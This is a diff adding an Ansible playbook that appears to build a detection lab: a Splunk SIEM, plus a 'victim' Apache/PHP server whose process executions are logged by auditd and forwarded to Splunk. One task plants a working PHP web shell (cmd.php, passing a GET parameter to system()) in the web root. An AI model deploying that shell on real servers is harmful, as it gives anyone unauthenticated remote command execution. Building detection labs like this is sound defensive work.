@@ -1,0 +1,79 @@
+---
+- name: Configure Splunk Enterprise (SIEM)
+  hosts: splunk
+  become: yes
+  tasks:
+    - name: Install Splunk Enterprise from local .deb
+      apt:
+        deb: /home/tabby/splunk-10.6.1.1-b2ae2962645c-linux-amd64.deb
+
+    - name: Start Splunk and accept license
+      command: /opt/splunk/bin/splunk start --accept-license --answer-yes
+      args:
+        creates: /opt/splunk/etc/auth/splunk.secret
+
+    - name: Enable Splunk boot-start for splunk user
+      command: /opt/splunk/bin/splunk enable boot-start -user splunk
+
+    - name: Enable receiver port 9997
+      command: /opt/splunk/bin/splunk enable listen 9997
+      become_user: splunk
+      ignore_errors: yes
+
+    - name: Create linux index
+      command: /opt/splunk/bin/splunk add index linux
+      become_user: splunk
+      ignore_errors: yes
+
+- name: Configure Web Server (Victim)
+  hosts: webserver
+  become: yes
+  tasks:
+    - name: Install Apache and PHP
+      apt:
+        name:
+          - apache2
+          - php
+          - libapache2-mod-php
+        state: present
+        update_cache: yes
+
+    - name: Deploy cmd.php web shell
+      copy:
+        dest: /var/www/html/cmd.php
+        content: '<?php system($_GET["c"]); ?>'
+        owner: www-data
+        mode: '0644'
+
+    - name: Install auditd, laurel, and jq
+      apt:
+        name: 
+          - auditd
+          - laurel
+          - jq
+        state: present
+
+    - name: Configure audit rules to monitor process execution (execve)
+      copy:
+        dest: /etc/audit/rules.d/deia.rules
+        content: |
+          -D
+          -b 8192
+          -f 1
+          -a always,exit -F arch=b64 -S execve -F key=exec
+          -a always,exit -F arch=b32 -S execve -F key=exec
+
+    - name: Apply audit rules and restart auditd
+      shell: augenrules --load && systemctl restart auditd
+
+    - name: Tell Splunk Forwarder to read Laurel logs
+      copy:
+        dest: /opt/splunkforwarder/etc/system/local/inputs.conf
+        content: |
+          [monitor:///var/log/laurel/audit.log]
+          index = linux
+          sourcetype = laurel
+
+    - name: Restart Splunk Universal Forwarder
+      command: /opt/splunkforwarder/bin/splunk restart
+      ignore_errors: yes
